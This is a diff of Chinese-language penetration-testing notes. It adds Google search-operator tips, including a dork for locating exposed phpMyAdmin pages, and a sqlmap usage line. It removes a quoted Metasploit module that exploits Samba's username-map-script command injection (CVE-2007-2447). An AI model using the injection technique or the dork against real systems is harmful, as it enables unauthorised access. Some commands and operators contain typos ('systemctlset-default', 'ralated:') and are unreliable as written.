@@ -17,13 +17,177 @@ author: 夜雨
 
 Systemd是一种新的linux系统服务管理器。它替换了init系统，能够管理系统的启动过程和一些系统服务，一旦启动起来，就将监管整个系统。
 
-- 切换至字符界面
-  ```sudo systemctl set-default multi-user.target```
-- 切换至图形界面
-  ```sudo systemctlset-default graphical.target```
-- 打开图形界面
-  ```sudo init 5```
-### Metasploit
+#### 切换至字符界面
+```shell
+sudo systemctl set-default multi-user.target
+```
+
+#### 切换至图形界面
+```shell
+sudo systemctlset-default graphical.target
+```
+
+#### 打开图形界面
+```shell
+sudo init 5
+```
+
+
+
+## google hack
+
+### 默认搜索模式
+
+google默认搜索模式为模糊搜索，并且可能会把长句或长短语拆分成更小的词进行搜索。
+
+示例：这是一个测试
+
+![默认模式测试截图1]({{site.url}}/images/google-hack-test01.jpg)  ![默认模式测试截图2]({{site.url}}/images/google-hack-test01-01.jpg)
+
+### 短语精确搜索
+
+示例："这是一个测试"
+
+对搜索短语加上英文双引号进行精确搜索模式搜索，不再对短语进行拆分。
+
+![精确搜索测试截图]({{site.url}}/images/google-hack-test02.jpg)
+
+### 通配符
+
+示例："这*个测试"
+
+通配符是指星号“*”。该选项必须在使用精确搜索引号内部使用。
+
+![通配符测试截图]({{site.url}}/images/google-hack-test03.jpg)
+
+### 点号匹配
+
+示例："这.一个测试"
+
+点号是指”.“，就是英文当中的句号。匹配的是单个字符，不是字词短语等内容。需要注意的是这个选项也需要在使用精确匹配的双引号当中使用。
+
+![点号匹配测试截图]({{site.url}}/images/google-hack-test04.jpg)
+
+### 布尔逻辑
+
+在Google中多个词之间的空格表示默认的逻辑与。当使用逻辑关系运算符时，词语与逻辑运算符之间需要使用空格分隔，包括之后的其他语法。逻辑非是特例——即减号与对应的连在一起。对于更为复杂的逻辑运算，可使用括号进行分组。
+
+#### 逻辑与
+
+示例1："这是一个" "测试"
+
+示例2："这是一个" and "测试"
+
+![逻辑与测试截图1]({{site.url}}/images/google-hack-test05.jpg)
+
+![逻辑与测试截图2]({{site.url}}/images/google-hack-test05-01.jpg)
+
+#### 逻辑或
+
+逻辑或和逻辑与类似。但是，逻辑或使用的是符号"\|"。并且逻辑或的结果只要包含其中之一就行。
+
+示例："这是一个" \| "测试"
+
+![逻辑或测试截图]({{site.url}}/images/google-hack-test06.jpg)
+
+#### 逻辑非
+
+示例："这是一个" -"测试"
+
+![逻辑非测试截图]({{site.url}}/images/google-hack-test07.jpg)
+
+### 条件约束
+
+示例："这是一个测试" + "测试"
+
+可以使用加号”+“进行条件约束搜索。加在加号后面的内容必须包含在搜索结果中。一般与精确搜索配合使用。
+
+![条件约束测试截图]({{site.url}}/images/google-hack-test08.jpg)
+
+### 数字范围
+
+示例："这是一个测试" 2016..2017年
+
+”..“两个点表示一个数字范围。应用于日期、货币、尺寸、重量、高度等单位范围搜索。用作范围界定时最好给定单位。否则搜索结果可能是无用的数据。
+
+![数值范围测试截图]({{site.url}}/images/google-hack-test09.jpg)
+
+### 括号分组
+
+括号”()“是分组符号，主要是为了避免逻辑混乱。
+
+示例：()"这是一个") | ("测试")
+
+![括号分组测试截图]({{site.url}}/images/google-hack-test10.jpg)
+
+### 标题搜索
+
+示例：intitle:"这是一个测试"
+
+![标题搜索测试截图]({{site.url}}/images/google-hack-test11.jpg)
+
+### 正文搜索
+
+示例：intext:"这是一个测试"
+
+![正文搜索测试截图]({{site.url}}/images/google-hack-test12.jpg)
+
+### 网址中搜索
+
+示例：inurl:this is a test
+
+![网址中搜索测试截图]({{site.url}}/images/google-hack-test13.jpg)
+
+### 锚链链接搜索
+
+示例：inanchor:"这是一个测试"
+
+![锚链链接搜索测试截图]({{site.url}}/images/google-hack-test14.jpg)
+
+### 文档类型搜索
+
+示例：filetype:sql
+
+![文档类型搜索测试截图]({{site.url}}/images/google-hack-test15.jpg)
+
+### 缓存搜索（快照搜索）
+
+示例：cache:43all.me
+
+![缓存搜索测试截图]({{site.url}}/images/google-hack-test16.jpg)
+
+### 相关网站搜索
+
+示例：ralated:www.kali.org
+
+![相关网站搜索测试截图]({{site.url}}/images/google-hack-test17.jpg)
+
+### 链接搜索
+
+示例：link:www.kali.org
+
+![链接搜索测试截图]({{site.url}}/images/google-hack-test18.jpg)
+
+### 网站搜索
+
+示例：site:www.kali.org
+
+![网站搜索测试截图]({{site.url}}/images/google-hack-test19.jpg)
+
+### 混合搜索
+
+示例：inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin
+
+![混合搜索测试截图1]({{site.url}}/images/google-hack-test20.jpg)
+
+点开一个网站之后的截图如下：
+
+![混合搜索测试截图2]({{site.url}}/images/google-hack-test21.jpg)
+
+
+
+## Metasploit
+
 #### usermap_script 漏洞相关笔记
 - usermap_script：CVE-2007-2447
 >利用Samba用户名映射脚本命令执行
@@ -38,108 +202,14 @@ Systemd是一种新的linux系统服务管理器。它替换了init系统，能�
 >
 > 漏洞的时间线：
 >
-> 1. 2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。
-> 2. 2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。
-> 3. 2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。
-> 4. 2007年5月10日：向vendor-sec邮件列表发布通知。
-> 5. 2007年5月14日：公开漏洞信息。
-
-```
-##
-# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
-##
-
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
-##
-
-# 这个和Python的import还要C的include一样的作用
-require 'msf/core'
-
-class Metasploit3 < Msf::Exploit::Remote
-# Metasploit3是从Msf::Exploit::Remote中继承的
-
-    Rank = ExcellentRanking
-
-    include Msf::Exploit::Remote::SMB
-
-    # For our customized version of session_setup_ntlmv1
-    CONST = Rex::Proto::SMB::Constants
-    CRYPT = Rex::Proto::SMB::Crypt
-
-    def initialize(info = {})
-        super(update_info(info,
-            'Name'           => 'Samba "username map script" Command Execution',
-            'Description'    => %q{
-                    This module exploits a command execution vulerability in Samba
-                versions 3.0.20 through 3.0.25rc3 when using the non-default
-                "username map script" configuration option. By specifying a username
-                containing shell meta characters, attackers can execute arbitrary
-                commands.
-
-                No authentication is needed to exploit this vulnerability since
-                this option is used to map usernames prior to authentication!
-            },
-            'Author'         => [ 'jduck' ],
-            'License'        => MSF_LICENSE,
-            'Version'        => '$Revision: 10040 $',
-            'References'     =>
-                [
-                    [ 'CVE', '2007-2447' ],
-                    [ 'OSVDB', '34700' ],
-                    [ 'BID', '23972' ],
-                    [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
-                    [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
-                ],
-            'Platform'       => ['unix'],
-            'Arch'           => ARCH_CMD,
-            'Privileged'     => true, # root or nobody user
-            'Payload'        =>
-                {
-                    'Space'    => 1024,
-                    'DisableNops' => true,
-                    'Compat'      =>
-                        {
-                            'PayloadType' => 'cmd',
-                            # *_perl and *_ruby work if they are installed
-                            # mileage may vary from system to system..
-                        }
-                },
-            'Targets'        =>
-                [
-                    [ "Automatic", { } ]
-                ],
-            'DefaultTarget'  => 0,
-            'DisclosureDate' => 'May 14 2007'))
-
-        register_options(
-            [
-                Opt::RPORT(139)
-            ], self.class)
-    end
+>    1. 2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。
+>    2. 2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。
+>    3. 2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。
+>    4. 2007年5月10日：向vendor-sec邮件列表发布通知。
+>    5. 2007年5月14日：公开漏洞信息。
 
 
-    def exploit
 
-        connect
-
-        # lol?
-        username = "/=`nohup " + payload.encoded + "`"
-        begin
-            simple.client.negotiate(false)
-            simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
-        rescue ::Timeout::Error, XCEPT::LoginError
-            # nothing, it either worked or it didn't ;)
-        end
-
-        handler
-    end
-
-end
-```
 ### OpenVas安装
 
 ```shell
@@ -155,11 +225,15 @@ sudo openvas-setup
 
 验证 openvas 正在运行:
 
-`netstat -tulpn`
+```shell
+netstat -tulpn
+```
 
 在 Kali 中启动 OpenVAS：
 
-`openvas-start`
+```shell
+openvas-start
+```
 
 安装后，你应该可以通过 `https://127.0.0.1:9392` 访问 OpenVAS 的 web 程序了。
 
@@ -168,4 +242,15 @@ sudo openvas-setup
 接受自签名证书后，你应该可以看到登录界面了。
 
 ### linux命令之ubuntu 重启网络服务而不需重启
-```sudo /etc/init.d/networking restart```
+```shell
+sudo /etc/init.d/networking restart
+```
+
+## sqlmap学习笔记
+
+```shell
+sqlmap -u URL [options]
+```
+
+
+
